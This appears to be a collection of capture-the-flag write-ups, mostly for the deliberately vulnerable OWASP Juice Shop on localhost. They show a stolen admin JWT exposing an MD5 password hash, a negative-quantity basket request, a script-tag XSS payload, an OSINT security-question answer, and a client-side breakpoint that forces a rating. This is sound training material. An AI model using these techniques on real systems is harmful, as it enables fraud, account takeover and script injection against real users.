$ curl -s 'http://localhost:3000/api/Users/1' -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwiZW1haWwiOiJhZG1pbkBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiMmU5ZmNmOGUzZGY0ZDQxNWM5NmJjZjI4OGQ1Y2E0YmEiLCJjcmVhdGVkQXQiOiIyMDE4LTAxLTAzIDIwOjE4OjAzLjg1NCArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDE4LTAxLTAzIDIxOjUwOjE5LjM0NCArMDA6MDAifSwiaWF0IjoxNTE1MDE2OTEzLCJleHAiOjE1MTUwMzQ5MTN9.blyXOlipJkRv73tyR3xBqAE9IDCVImPVVkygMxG_yb_-kDwRNxw4QlR7l8IOLijm2noEOm9y591ds_vy7eTia28QZ8iiTsISPUH-3K_E1qibfntobMvSKeuC-bfFlQ6If7HT9os2ztncJXKw-7cYn4ACB4DkIYUG2ll35DdwXjQ' | python -mjson.tool
{
    "data": {
        "createdAt": "2018-01-03T22:08:12.171Z",
        "email": "admin@juice-sh.op",
        "id": 1,
        "password": "0192023a7bbd73250516f069df18b500",
        "updatedAt": "2018-01-03T22:08:12.171Z"
    },
    "status": "success"
}
```

Finally, a simple Google search for `0192023a7bbd73250516f069df18b500` returns
that this is the MD5 of `admin123`. Logging in with this password completes the
challenge!



### File: writeups/Juice Shop/Payback Time/README.md

> Place an order that makes you rich.

The typical way to do this on sites that allow for payment is to mess with the
payment processing system. E.g. set item's value to $0.00, set negative
quantities of items, etc. Let's start looking there.

After visiting a user's basket we're given a few options. The most obvious
approach is to play with the "Quantity." Clicking on the webpage doesn't allow
us to set a lower value than `1`. Let's crack open the Chrome inspector and
see what API calls are being made.

When clicking the "Quantity" buttons we can see a few requests fly by. The only
one that changes system state is a `PUT` request to the following endpoint:

```
/api/BasketItems/<item-number>
```

We can also see it takes a request payload of:

```
{"quantity": <quantity-value>}
```

Let's "Copy as cURL" and set a negative quantity:

```
$ curl -X PUT ... '{"quantity":-10}'
{"status":"success","data":{"id":9,"quantity":-10,"createdAt":"2018-02-05T19:58:04.663Z","updatedAt":"2018-02-05T20:03:37.738Z","BasketId":2,"ProductId":1}}
```

Success! Now clicking "Checkout" should complete the challenge!



### File: writeups/Juice Shop/Reset Jim's Password/README.md

This one took me a while. Initially I spent quite a bit of time playing
around with the various APIs and seeing if that lead to anything. It did not.

After reading the hint I decided to take a different approach:

```
It's hard for celebrities to pick a security question from a hard-coded list where the answer is not publicly exposed. Click for more hints.
```

This seems like more of an OSINT type problem, not a technical one. It's time
to do a bit of research on this Jim fella'.

Where can we find more information about Jim in the Juice Shop? After clicking
around a bit and becoming more familiar with the system I noticed Jim left some
reviews of various products.

Let's iterate through the reviews and see if we can dig up anything on Jim:

```
$ for i in $(seq 1 30); do curl -s http://localhost:3000/rest/product/$i/reviews | python -mjson.tool; done
...
{
    "data": [
        {
            "_id": "HCQzF4Lju6N56dfbo",
            "author": "jim@juice-sh.op",
            "message": "Fresh out of a replicator.",
            "product": 17,
            "text": "Fresh out of a replicator."
        }
    ],
    "status": "success"
}
...
{
    "data": [
        {
            "_id": "97MjYDqEp24KvBPHi",
            "author": "jim@juice-sh.op",
            "message": "A vital ingredient for a succesful playthrough.",
            "product": 22,
            "text": "A vital ingredient for a succesful playthrough."
        }
    ],
    "status": "success"
}
...
```

Hmm, "replicator" may be a good term we can search on. Searching Google for
"jim replicator" turns up an esoteric Google Books Result for "The Guest on
the Belovo." After reading through the relevant sections it seems like this is
a dead-end.

If we just search Google for "replicator" the second result is a Star Trek
reference. Interesting. This probably would've immediately stood out to a
"Treky", but that I am not.

From here searching "jim star trek" turns up "James T. Kirk", AHA!
James -> Jim. Clicking the Wikipedia entry gives a list of family members.

If we look at the Security Question, it asks:

```
Your eldest siblings middle name?
```

Wikipedia lists George Samuel Kirk as a sibling. Entering "Samuel" and changing
the password solves the problem!



### File: writeups/Juice Shop/Score Board/README.md

I initially looked around the page for a "Scoreboard" button, or some UI
element leading to a score board.

Next I guessed at the URL `/#/scoreboard`, which ended up being close, but
incorrect.

Finally, I figured they would do the classic "first challenge" for a webapp...
commented out HTML. Sure enough, after inspecting the source and searching for
"score" it lead to the following code:

```
<!--
<li class="dropdown">
	<a href="#/score-board">Score Board</a>
</li>
-->
```

And voila! `/#/score-board` did the trick.



### File: writeups/Juice Shop/XSS Tier 1/README.md

Given the description, and the fact that the search box is the only input field
on the page, I tried putting `<script>alert("XSS1")</script>` in the search box
and it worked!



### File: writeups/Juice Shop/Zero Stars/README.md

This one stumped me for a while. I think my final solution may not have been
what they were intending, but, then again, that's security bugs.

For the longest time I was mucking around in the HTML and trying to submit
the form. If we inspect the HTML while clicking the various Rating buttons
we can see that it's changing the `aria-valuenow` value in the form. So I
tried setting this to `0` and submitting by removing `disabled="disabled"`
on the submit button. This didn't work though :(

I never did find out exactly why that didn't work. It seems this form is using
some weird Angular magic to make everything happen, so maybe it's not enough
to simply modify the HTML, it seems like we have to trigger some JS code. I
think the action of clicking one of the ratings has some side-effects that
modifying the HTML manually doesn't.

Anyways, if we look at the rating stars we see that clicking them calls a JS
function: `ng-click="rate($index + 1)"`. This `rate` function must be what's
performing the action behind the scenes. Since my Chrome Inspector skills are
lacking I couldn't find exactly where this `rate` function was defined. Time
to break out the 'ol CLI skills...

There's this cool flag you can pass to `wget` that will pull down all the files
necessary to run a particular web page yourself, including all the JS files for
grepping :)

```
$ wget --mirror http://localhost:3000/#/contact
```

We now have the entire page mirrored in the `localhost:3000` folder. Dope.

We can now search for this `rate` function:

```
$ rg --files-with-matches 'rate\(' localhost\:3000/
localhost:3000/bower_components/angular-bootstrap/ui-bootstrap.min.js
localhost:3000/bower_components/angular-bootstrap/ui-bootstrap-tpls.min.js
```

By the way, `rg` is short for `ripgrep`, an awesome tool that can *almost*
replace `grep`. It's approximately a zillion times faster than `grep`, learn
it, love it.

Anyways... we can now investigate the `ui-bootstrap.min.js` and
`ui-bootstrap-tpls.min.js` files for this `rate` function. Since I don't have
a good CLI de-minify tool I just headed back to the Chrome Inspector and took
a peak at those two files. From here we see they look like:

```
a.rate = function(b) {
	if (!a.readonly && b >= 0 && b <= a.range.length) {
		var c = e.enableReset && d.$viewValue === b ? 0 : b;
		d.$setViewValue(c),
		d.$render()
	}
}
```

Instead of trying to get the correct value passed to this function we can
just place a breakpoint on the `setViewValue` line` and set `c = 0;` ourselves.
Next we click submit, and voila, we've set a 0 star rating!

The Chrome Inspector can be very powerful and a useful tool to have in your
arsenal. Further, you should never rely on Javascript, or anything client-side,
to validate things for you.



### File: writeups/Potatopla/Challenge 11/README.md

https://www.potatopla.net/crypto/challenges/11/

> Read the math, follow my rule, scan me out.

> (0,0,0) < 5 < (255,255,255)

The `scan me out` portion tipped me off quickly. That combined with the 
white (`(255,255,255)`) and black (`(0,0,0)`) RGB values led me to QR codes.

From there if we look at the grid of math operations we see numbers `< 5` and
`> 5` which confirms the second hint. So basically we need to evaluate these
expressions and update the grid with the corresponding color.

I ended up using this code (requires jQuery) to automate the process:

```
$("table").attr("border", "0");
$("table").attr("cellspacing", "0");
$("td").each(function() {
    $this = $(this);
    text = $this[0].innerHTML;
    value = eval(text);
    if (value < 5) {
        $this.css("background-color", "rgb(0,0,0)");
        $this.css("color", "rgb(0,0,0)");
    } else if (value > 5) {
        $this.css("background-color", "rgb(255,255,255)");
        $this.css("color", "rgb(255,255,255)");
    } else {
        console.log("Error!");
    }
});
```

Before:

![Before](before.png)

After:

![After](after.png)

Finally if we scan the QR code (e.g. with a phone) we get a URL to append to
the challenge's URL. After appending we're sent to a page containing the flag.



### File: writeups/README.md

# writeups
